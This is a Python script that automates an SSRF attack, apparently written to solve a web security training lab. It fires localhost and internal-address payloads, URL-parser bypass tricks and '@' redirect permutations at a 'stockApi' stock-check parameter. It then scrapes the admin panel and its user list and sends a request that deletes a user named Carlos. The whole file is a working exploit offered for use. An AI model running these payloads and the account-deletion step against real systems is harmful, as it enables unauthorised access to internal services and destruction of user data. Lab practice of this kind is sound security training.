import requests
import re
from lxml import html
import typer
from bs4 import BeautifulSoup
from rich.console import Console
from rich.style import Style
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
import time

console = Console()
layout = Layout()
usersTable = Table()
payloadsTable = Table()
danger_style = Style(color="red", bold=True)

SERVER=''

validApiEndpoint = 'stock.weliketoshop.net:8080'

possiblePayload = list()

internalIP = '''http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
http://localhost:80
http://localhost:443
http://localhost:22
https://127.0.0.1/
https://localhost/
http://[::]:80/
http://[::]:25/
http://[::]:22/ 
http://[::]:3128/
http://0000::1:80/
http://0000::1:25/
http://0000::1:22/
http://0000::1:3128/
http://localtest.me
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
http://2130706433/
http://3232235521/
http://3232235777/
http://2852039166/
http://[0:0:0:0:0:ffff:127.0.0.1]
http://0/
'''

orangeTsaiBypass='''\@
\@@
:\@@
#\@
%2523@
%23@'''

def xpath(response, expression):
    html_document = html.fromstring(response.content)
    return html_document.xpath(expression)

def createTables():
    layout.split_row(
            Layout(name="LEFT"),
            Layout(name="RIGHT")
            )
    usersTable.add_column('Users')
    layout["LEFT"].split(Layout(Panel(title="Admin Panel", renderable=usersTable)))

    payloadsTable.add_column('Payloads')
    layout["RIGHT"].split(Layout(Panel(title="Possible working payload", renderable=payloadsTable)))

def trySSRF(link, payload):
    response = requests.post(link, data = {"stockApi":payload})
    console.log('Trying payload: ' + response.request.body)
    if b'External stock check' not in response.content and b'Invalid external stock'  not in response.content and  b'Missing parameter' not in response.content:
        if len(response.content) > 4 and response.status_code == 200:
            console.log('Possible good payload :) >>> PAYLOAD = '+ response.request.body, style=danger_style)
            possiblePayload.append(payload)

def executeAttack(link):
    response = requests.post(link, data = {"stockApi":possiblePayload[0]})    
    soup = BeautifulSoup(response.text, 'lxml')
    value = soup.find('section', attrs={'class' : 'top-links'})
    path = str(value).split('"')[5] #admin path
    response = requests.post(link, data = {"stockApi":possiblePayload[0]+path})
    usersHtml = xpath(response, '//section/div/span')
    soup = BeautifulSoup(response.text, 'lxml')
    deleteList = list()
    for a in soup.find_all(href=re.compile("delete")): 
        deleteList.append(possiblePayload[0]+a['href'])
    for i in range(0,len(usersHtml)):
        usersTable.add_row(usersHtml[i].text[:-2],style=danger_style)
    for payload in possiblePayload:
        payloadsTable.add_row(payload)
    console.print(layout)
    with console.status('Removing Carlos Account:'):
        time.sleep(5)
        response = requests.post(link, data = {"stockApi":deleteList[0]})
    console.log('Removed', style=danger_style)

def goodPayload():
    console.clear()
    console.log('Valid Payload list:')
    for payload in possiblePayload:
        time.sleep(1)
        console.log(payload, style=danger_style)
    time.sleep(3)

def main(link: str):
    global internalIP
    global SERVER
    SERVER = link
    createTables()
    IPList = internalIP.split()
    with console.status('TRYING SIMPLE SSRF PAYLOADS'):
        for internalIP in IPList:
            trySSRF(f'{SERVER}/product/stock',internalIP)
    with console.status('TRYING SSRF PERMUTATIONS with redir @ trick...'):
        for internalIP in IPList:
            trySSRF(f'{SERVER}/product/stock', f'{validApiEndpoint}@{internalIP}')
    with console.status('TRYING SSRF ORANGTSAI bypass'):
        for  internalIP in IPList:
            for trick in orangeTsaiBypass.split():
                trySSRF(f'{SERVER}/product/stock',f'{internalIP}{trick}{validApiEndpoint}')
    goodPayload()
    executeAttack(f'{SERVER}/product/stock')

if __name__ == "__main__":
    typer.run(main)
